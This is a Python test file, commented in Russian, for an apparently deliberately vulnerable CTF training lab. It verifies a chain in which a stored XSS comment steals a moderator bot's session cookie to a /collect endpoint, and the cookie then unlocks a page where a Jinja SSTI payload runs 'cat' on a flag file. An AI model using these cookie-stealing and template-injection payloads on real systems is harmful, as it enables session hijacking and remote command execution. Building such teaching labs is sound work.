# -*- coding: utf-8 -*-
"""Таск 11 (босс): полная цепочка за один флаг.

XSS-комментарий -> бот-модератор подхватил его -> кука бота в stolen
-> /moderate/import с этой кукой -> SSTI -> файл flag_boss.txt -> флаг.

Тест поднимает живой сервер и живой поток бота: без реального HTTP-хопа
цепочка не проверяется, а именно в нём вся суть таска.

Запуск: python -m unittest discover -s tests -v
Демо с печатью флага: python tests/test_boss.py
"""
import os
import socket
import sqlite3
import sys
import threading
import time
import unittest

os.environ.setdefault("LOMBLOG_BOT", "0")  # бота поднимаем вручную, со своим интервалом

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import requests  # noqa: E402
from werkzeug.serving import make_server  # noqa: E402

import app as lab  # noqa: E402

# XSS-пейлоад студента: уводит куку бота на «сервер атакующего» в этом же стенде.
# Классический <img onerror> у бота не сработает: наш «браузер» исполняет
# только <script>, поэтому берём именно его.
MARKER = "boss-chain-test"
XSS_PAYLOAD = (
    f"<!-- {MARKER} --><script>"
    "new Image().src='/collect?c='+document.cookie;"
    "</script>"
)
STUDENT = "alice"


def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def fetchone(sql, args=()):
    """Читаем состояние стенда напрямую из SQLite — без HTTP и без g."""
    db = sqlite3.connect(lab.DB)
    db.row_factory = sqlite3.Row
    try:
        return db.execute(sql, args).fetchone()
    finally:
        db.close()


def student_id():
    row = fetchone("SELECT id FROM users WHERE username=?", (STUDENT,))
    return row["id"] if row else 1


class LiveServerCase(unittest.TestCase):
    """Общая обвязка: живой сервер, чистое состояние бота перед каждым тестом."""

    @classmethod
    def setUpClass(cls):
        lab.app.config["TESTING"] = True
        cls.server = make_server("127.0.0.1", free_port(), lab.app, threaded=True)
        cls.base = f"http://127.0.0.1:{cls.server.server_port}"
        cls.thread = threading.Thread(target=cls.server.serve_forever, daemon=True)
        cls.thread.start()

    @classmethod
    def tearDownClass(cls):
        lab.stop_moderator_bot()
        cls.server.shutdown()
        cls.thread.join(timeout=5)
        with sqlite3.connect(lab.DB) as db:
            db.execute("DELETE FROM comments WHERE body LIKE ?", (f"%{MARKER}%",))
            db.execute("DELETE FROM stolen")
            db.execute("UPDATE bot_cursor SET last_comment_id="
                       "(SELECT COALESCE(MAX(id), 0) FROM comments)")

    def setUp(self):
        lab.app.config["TESTING"] = True
        lab.stop_moderator_bot()
        # Курсор бота — на текущий максимум: тест должен поймать свой комментарий,
        # а не хвост прошлых прогонов.
        with sqlite3.connect(lab.DB) as db:
            db.execute(
                "INSERT INTO bot_cursor(id, last_comment_id) VALUES(1, "
                "(SELECT COALESCE(MAX(id), 0) FROM comments)) "
                "ON CONFLICT(id) DO UPDATE SET "
                "last_comment_id=excluded.last_comment_id")
            db.execute("DELETE FROM stolen")

    def leave_xss_comment(self):
        client = lab.app.test_client()
        with client.session_transaction() as sess:
            sess["user_id"] = student_id()
            sess["username"] = STUDENT
            sess["is_admin"] = 0
        r = client.post("/post/1", data={"body": XSS_PAYLOAD})
        self.assertIn(r.status_code, (302, 200))
        html = client.get("/post/1").get_data(as_text=True)
        # комментарий отдаётся сырым — XSS жив (таск 2 не «починили»)
        self.assertIn("<script>", html)

    def wait_for_stolen(self, timeout=20.0):
        deadline = time.time() + timeout
        while time.time() < deadline:
            row = fetchone("SELECT cookie, user_agent FROM stolen "
                           "ORDER BY id DESC LIMIT 1")
            if row:
                return row
            time.sleep(0.2)
        self.fail("бот не принёс куку на /collect за %.0f c" % timeout)


class BossChainTest(LiveServerCase):
    """Цепочка целиком, по шагам — с проверкой каждого шага."""

    def test_full_chain(self):
        # шаг 1: stored XSS в комментарии
        self.leave_xss_comment()
        # шаг 2: бот-модератор читает комментарии и уводит свою куку
        lab.start_moderator_bot(interval=0.2, base=self.base)
        row = self.wait_for_stolen()
        stolen = row["cookie"]
        self.assertTrue(stolen, "кука пустая")
        self.assertIn("LomBlog-ModeratorBot", row["user_agent"] or "")
        # украдена именно flask-сессия: "session=<подписанная кука>"
        self.assertTrue(stolen.startswith("session="), stolen[:40])
        from flask.sessions import SecureCookieSessionInterface
        ser = SecureCookieSessionInterface().get_signing_serializer(lab.app)
        data = ser.loads(stolen[len("session="):])
        self.assertEqual(data.get("role"), "moderator")
        self.assertEqual(data.get("username"), lab.MODERATOR_USER)

        # шаг 3: без куки импорт закрыт, с кукой — открыт
        anon = requests.Session()
        r = anon.post(self.base + "/moderate/import",
                      data={"template": "{{7*7}}"}, allow_redirects=False)
        self.assertIn("403", r.text)

        sess = requests.Session()
        # трофей вида "session=<value>" — в куку кладём только value
        sess.cookies.set("session", stolen.split("=", 1)[1])
        r = sess.get(self.base + "/moderate/import")
        self.assertEqual(r.status_code, 200)
        self.assertIn("Импорт шаблона", r.text)
        self.assertNotIn("403", r.text)

        # шаг 4: SSTI читает файл с флагом босса
        self.assertTrue(os.path.exists(lab.BOSS_FLAG_FILE),
                        "файл флага босса не создан ensure_lab_files()")
        payload = ("{{ cycler.__init__.__globals__.os.popen("
                   f"'cat {lab.BOSS_FLAG_FILE}').read() }}}}")
        r = sess.post(self.base + "/moderate/import", data={"template": payload})
        self.assertEqual(r.status_code, 200)
        self.assertIn(lab.FLAG_BOSS, r.text)
        type(self).last_stolen = stolen  # для демо-прогона (python tests/test_boss.py)


    def test_img_onerror_payload_also_works(self):
        """Не только <script>: onerror в боте тоже исполняется."""
        client = lab.app.test_client()
        with client.session_transaction() as sess:
            sess["user_id"] = student_id()
            sess["username"] = STUDENT
        payload = (f"<!-- {MARKER} --><img src=x "
                   "onerror=\"location='/collect?c='+document.cookie\">")
        client.post("/post/1", data={"body": payload})
        lab.start_moderator_bot(interval=0.2, base=self.base)
        row = self.wait_for_stolen()
        self.assertIn("session=", row["cookie"])


class BossStepsTest(LiveServerCase):
    """Точечные проверки отдельных объектов таска 11."""

    def test_collect_stores_cookie_and_returns_204(self):
        r = requests.get(self.base + "/collect", params={"c": "session=abc"})
        self.assertEqual(r.status_code, 204)
        row = fetchone("SELECT cookie FROM stolen ORDER BY id DESC LIMIT 1")
        self.assertEqual(row["cookie"], "session=abc")

    def test_collect_panel_lists_loot(self):
        requests.get(self.base + "/collect", params={"c": "session=loot"})
        r = requests.get(self.base + "/collect")
        self.assertEqual(r.status_code, 200)
        self.assertIn("session=loot", r.text)

    def test_moderate_import_requires_moderator_cookie(self):
        client = lab.app.test_client()
        r = client.post("/moderate/import", data={"template": "{{7*7}}"})
        self.assertIn("403", r.get_data(as_text=True))

    def test_moderator_session_has_no_ui_login(self):
        # Пароля у бота нет: через форму логина в роль не попасть и из бэкапа
        # (таск 4) пароль не вычитать — только утащить куку XSS'ом.
        client = lab.app.test_client()
        for pwd in ("", "n0t_f0r_hum4ns", "moderator"):
            r = client.post("/login", data={"username": lab.MODERATOR_USER,
                                            "password": pwd})
            self.assertIn("Неверный логин или пароль", r.get_data(as_text=True))

    def test_moderator_cookie_is_role_moderator(self):
        from flask.sessions import SecureCookieSessionInterface
        ser = SecureCookieSessionInterface().get_signing_serializer(lab.app)
        data = ser.loads(lab.moderator_cookie_value())
        self.assertEqual(data.get("role"), "moderator")
        self.assertEqual(data.get("username"), lab.MODERATOR_USER)

    def test_boss_flag_registered_in_game(self):
        row = fetchone("SELECT value, points FROM flags WHERE name='Босс'")
        self.assertIsNotNone(row, "таск 11 не зарегистрирован в flags")
        self.assertEqual(row["value"], lab.FLAG_BOSS)
        self.assertGreaterEqual(row["points"], 500)

    def test_flag_boss_file_exists_and_holds_flag(self):
        with open(lab.BOSS_FLAG_FILE, encoding="utf-8") as fh:
            self.assertIn(lab.FLAG_BOSS, fh.read())

    def test_secrets_are_gitignored(self):
        with open(os.path.join(lab.BASE_DIR, ".gitignore"), encoding="utf-8") as fh:
            ignored = fh.read().splitlines()
        self.assertIn("flag_boss.txt", ignored)
        self.assertIn("TEACHER_SOLUTIONS.md", ignored)


if __name__ == "__main__":
    # Демо-прогон цепочки с печатью флага: python tests/test_boss.py
    suite = unittest.TestSuite()
    suite.addTest(BossChainTest("test_full_chain"))
    res = unittest.TextTestRunner(verbosity=2).run(suite)
    if res.wasSuccessful():
        print("\n🍪 украденная кука бота:", BossChainTest.last_stolen)
        print("👑 /moderate/import -> SSTI ->", lab.FLAG_BOSS)
    sys.exit(0 if res.wasSuccessful() else 1)
